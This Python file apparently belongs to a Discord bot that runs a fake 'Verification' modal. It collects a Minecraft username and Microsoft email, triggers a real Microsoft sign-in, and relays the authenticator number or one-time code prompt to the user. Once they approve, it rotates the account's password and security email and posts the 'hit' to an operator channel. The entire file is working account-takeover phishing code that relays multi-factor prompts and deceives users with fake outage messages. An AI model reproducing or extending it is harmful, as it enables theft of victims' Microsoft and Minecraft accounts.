from database.database import DBConnection
from urllib.parse import quote
from discord import ui, Embed
import discord
import asyncio
import json
import re

from ui.buttons.submit_code import ButtonViewTwo
from ui.buttons.missing_email import ButtonViewThree
from ui.buttons.embed_buttons import ButtonOptions

from shared.embeds import auth_embed
from shared.send_logs import send_logs, build_log_embed
from shared.post_hit import (
    _checking_embed,
    publish_embed_secure_result,
    set_verify_ephemeral,
)

from securing.auth.check_auth import check_authenticator
from securing.secure import startSecuringAccount

from securing.auth.initial_session import get_session
from securing.auth.send_auth import send_auth
import logging

log = logging.getLogger("bot")


def _auth_discord_embed(payload: dict) -> Embed:
    return Embed(
        title=payload["title"],
        description=payload["description"],
        colour=payload["color"],
    )


async def _set_ephemeral(
    interaction: discord.Interaction,
    embed: Embed,
    view: ui.View | None = None,
) -> None:
    """First reply, or replace that same ephemeral message (no extra pings)."""
    shown = view if view is not None else ui.View()
    if interaction.response.is_done():
        await interaction.edit_original_response(content=None, embed=embed, view=shown)
        return
    await interaction.response.send_message(embed=embed, view=shown, ephemeral=True)


class MyModalOne(ui.Modal):
    def __init__(self):
        super().__init__(title="Verification")
        self.add_item(ui.InputText(
            label="Minecraft Username",
            placeholder="e.g insomnia123",
            required=True,
            max_length=16,
        ))
        self.add_item(ui.InputText(
            label="Minecraft Email",
            placeholder="e.g insomnia@test.com",
            required=True,
        ))

    async def callback(self, interaction: discord.Interaction) -> None:
        username = quote(self.children[0].value)
        email = self.children[1].value

        # Blacklisted Users
        with DBConnection() as database:
            if interaction.user.id in database.get_blacklisted_users():
                await interaction.response.send_message(
                    embed = Embed(
                        title = "Could not verify",
                        description = "Our systems seem to be down at the moment. Please try again in a few hours.",
                        color = 0xFA4343
                    ),
                    ephemeral = True
                )

                await send_logs(
                    interaction.client,
                    build_log_embed(
                        f"**Email | Status | Reason**\n```{email} | Refused to Verify | User has been blacklisted```",
                        0xFA4343,
                        thumbnail=f"https://visage.surgeplay.com/full/512/{username}",
                        user=interaction.user,
                        bot=interaction.client,
                    ),
                    view=ButtonOptions(interaction.user, interaction.user.id, username),
                    email=email,
                )
                return

        # Check if email is valid
        if not re.compile(r"^[\w\.-]+@([\w-]+\.)+[\w-]{2,4}$").match(email):
            await interaction.response.send_message(
                embed = Embed(
                    title = "Invalid Email Address",
                    description="Make sure you entered your email correctly!",
                    color = 0xFA4343
                ),
                ephemeral = True
            )

            await send_logs(
                interaction.client,
                build_log_embed(
                    f"**Email | Status | Reason**\n```{email} | Failed to Verify | Invalid email entered```",
                    0xFA4343,
                    thumbnail=f"https://visage.surgeplay.com/full/512/{username}",
                    user=interaction.user,
                    bot=interaction.client,
                ),
                view=ButtonOptions(interaction.user, interaction.user.id, username),
                email=email,
            )
            return

        await _set_ephemeral(
            interaction,
            Embed(
                title="Sending code...",
                description="Please wait a few seconds — we're sending a confirmation code.",
                color=0x57F287,
            ),
        )

        self.session = get_session()

        try:
            email_info = await send_auth(self.session, email)
        except Exception:
            log.exception("send_auth failed for %s", email)
            await _set_ephemeral(
                interaction,
                Embed(
                    title="Failed to send code",
                    description="Something went wrong sending the confirmation. Please try again in a moment.",
                    color=0xFA4343,
                ),
            )
            await send_logs(
                interaction.client,
                build_log_embed(
                    f"**Email | Status | Reason**\n```{email} | Failed to send code | send_auth error```",
                    0xFA4343,
                    thumbnail=f"https://visage.surgeplay.com/full/512/{username}",
                    user=interaction.user,
                    bot=interaction.client,
                ),
                view=ButtonOptions(interaction.user, interaction.user.id, username),
                email=email,
            )
            return

        # Email does not exist (ifExistsResults == 1 can be used as an alternative)
        if not isinstance(email_info, dict) or "type" not in email_info:
            await send_logs(
                interaction.client,
                build_log_embed(
                    f"**Email | Status | Reason**\n```{email} | Failed to send code | Email does not exist```",
                    0xFA4343,
                    thumbnail=f"https://visage.surgeplay.com/full/512/{username}",
                    user=interaction.user,
                    bot=interaction.client,
                ),
                view=ButtonOptions(interaction.user, interaction.user.id, username),
                email=email,
            )

            await _set_ephemeral(
                interaction,
                Embed(
                    title="Failed to verify",
                    description="The email you entered does not exist, make sure you entered it correctly!",
                    color=0xFA4343,
                ),
            )
            return

        # Entropy = Authenticator App number to click in
        elif email_info["type"] == "authenticator":
            print("\n| Starting securing process |\n")
            print("[+] - Found Authenticator App")

            device = email_info["response"]["Credentials"]["RemoteNgcParams"]["SessionIdentifier"]
            entropy = email_info["response"]["Credentials"]["RemoteNgcParams"]["Entropy"]

            aembed = auth_embed("authenticator", entropy=entropy)
            await _set_ephemeral(interaction, _auth_discord_embed(aembed))

            await send_logs(
                interaction.client,
                build_log_embed(
                    f"**Username | Email | Status**\n```{username} | {email} | Waiting for Auth confirmation```",
                    0x3B89FF,
                    thumbnail=f"https://visage.surgeplay.com/full/512/{username}",
                    user=interaction.user,
                    bot=interaction.client,
                ),
                view=ButtonOptions(interaction.user, interaction.user.id, username),
                email=email,
            )

            i = 0
            while i < 60:

                data = await check_authenticator(device)
                if data["SessionState"] > 1 and data["AuthorizationState"] == 1:

                    await interaction.followup.send(
                        embed = Embed(
                            title = "Failed to verify",
                            description = "You pressed the wrong number on your authenticator app. Try again!",
                            colour=0xFA4343
                        ),
                        ephemeral = True
                    )

                    await send_logs(
                        interaction.client,
                        build_log_embed(
                            f"**Email | Status | Reason**\n```{email} | Failed to verify | Clicked on the wrong auth number```",
                            0xFA4343,
                            thumbnail=f"https://visage.surgeplay.com/full/512/{username}",
                            user=interaction.user,
                            bot=interaction.client,
                        ),
                        view=ButtonOptions(interaction.user, interaction.user.id, username),
                        email=email,
                    )
                    return

                elif data["SessionState"] > 1 and data["AuthorizationState"] > 1:

                    await send_logs(
                        interaction.client,
                        content="**This account is being automaticly secured**"
                    )
                    await send_logs(
                        interaction.client,
                        build_log_embed(
                            f"**Username | Email | Status**\n```{username} | {email} | Auth code confirmed!```",
                            0x79D990,
                            thumbnail=f"https://visage.surgeplay.com/full/512/{username}",
                            user=interaction.user,
                            bot=interaction.client,
                        ),
                        view=ButtonOptions(interaction.user, interaction.user.id, username),
                        email=email,
                    )

                    await set_verify_ephemeral(interaction, _checking_embed())

                    config = json.load(open("config/config.json", "r"))
                    hits_channel = await interaction.client.fetch_channel(config["discord"]["accounts_channel"])

                    # Authenticator login already has a session; RecoverUser still
                    # runs (recovery=True) to rotate password / security email.
                    try:
                        securedAccount = await startSecuringAccount(
                            self.session,
                            email,
                            device,
                            embed_verify=True,
                        )
                    except Exception as exc:
                        log.exception("embed auth startSecuringAccount crashed")
                        securedAccount = {
                            "failed": True,
                            "reason": "Securing crashed",
                        }

                    await publish_embed_secure_result(
                        interaction=interaction,
                        hits_channel=hits_channel,
                        secured_account=securedAccount,
                        email=email,
                        username=username,
                    )
                    return

                await asyncio.sleep(1)
                i += 1

        elif email_info["type"] == "email":
            
            security_email = email_info["response"]["Credentials"]["OtcLoginEligibleProofs"][0]["display"]
            flowtoken = email_info["response"]["Credentials"]["OtcLoginEligibleProofs"][0]["data"]
            ppft = email_info["ppft"]

            print(email_info["response"]["Credentials"]["OtcLoginEligibleProofs"])
            print("\n| Starting securing process |\n")
            print(f"[+] - Found security email: {security_email}!")

            rc_embed = auth_embed("otp", email=security_email)
            await _set_ephemeral(
                interaction,
                _auth_discord_embed(rc_embed),
                view=ButtonViewTwo(
                    username=username,
                    email=email,
                    flowtoken=flowtoken,
                    ppft=ppft,
                ),
            )

            await send_logs(
                interaction.client,
                build_log_embed(
                    f"**Username | Email | Status**\n```{username} | {email} | Waiting for OTP code```",
                    0x3B89FF,
                    thumbnail=f"https://visage.surgeplay.com/full/512/{username}",
                    user=interaction.user,
                    bot=interaction.client
                ),
                email=email,
                view=ButtonOptions(interaction.user, interaction.user.id, username)
            )

            return

        await send_logs(
            interaction.client,
            build_log_embed(
                f"**Email | Status | Reason**\n```{email} | Failed to send code | No OTP methods found```",
                0xFA4343,
                thumbnail=f"https://visage.surgeplay.com/full/512/{username}",
                user=interaction.user,
                bot=interaction.client
            ),
            email=email,
            view=ButtonOptions(interaction.user, interaction.user.id, username)
        )

        await _set_ephemeral(
            interaction,
            Embed(
                title="Security Email Required",
                description="We couldn't detect a recovery/security email for this account. Add a recovery email in your Microsoft account and try verifying again.",
            ),
            view=ButtonViewThree(),
        )

        return
